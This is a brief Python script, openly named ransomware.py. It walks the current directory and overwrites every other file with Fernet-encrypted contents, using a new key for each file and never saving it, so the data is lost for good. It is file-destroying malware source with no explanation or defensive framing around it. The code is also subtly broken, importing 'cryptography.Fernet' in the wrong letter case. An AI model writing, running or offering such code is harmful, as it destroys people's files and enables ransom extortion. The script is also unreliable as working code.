import os
from cryptography.Fernet import Fernet

file = os.listdir()

for filename in file:
    if filename == "ransomware.py":
        continue
    with open(filename, "rb") as f:
        data = f.read()

    key = Fernet.generate_key()
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data)

    with open(filename, "wb") as f:
        f.write(encrypted_data)